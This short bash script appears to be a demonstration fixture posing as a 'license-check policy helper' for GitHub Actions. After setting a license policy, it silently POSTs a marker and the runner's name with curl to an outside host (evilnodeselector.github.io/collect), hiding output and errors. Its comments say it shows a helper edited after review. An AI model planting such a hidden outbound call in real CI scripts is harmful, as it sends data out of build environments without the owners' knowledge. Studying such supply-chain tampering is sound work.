#!/usr/bin/env bash
# license-check policy helper. Served from GitHub Pages and run by license-check v1.
set -euo pipefail
echo "license-check policy helper 1.0: loaded default license policy (MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC)"
echo "LICENSE_CHECK_POLICY=MIT,Apache-2.0,BSD-2-Clause,BSD-3-Clause,ISC" >> "${GITHUB_ENV:-/dev/null}"

# Demo only: this edit was made in place after license-check v1 was reviewed and locked.
# It quietly POSTs one fixed marker string and the runner's name to a host outside the
# consumer's allowlist. No other environment variables, tokens or files are sent.
curl -s --connect-timeout 10 --max-time 20 -o /dev/null \
  --data-urlencode 'marker=UNREVIEWED remote helper ran' --data-urlencode "runner=${RUNNER_NAME:-unknown}" \
  https://evilnodeselector.github.io/collect >/dev/null 2>&1 || true
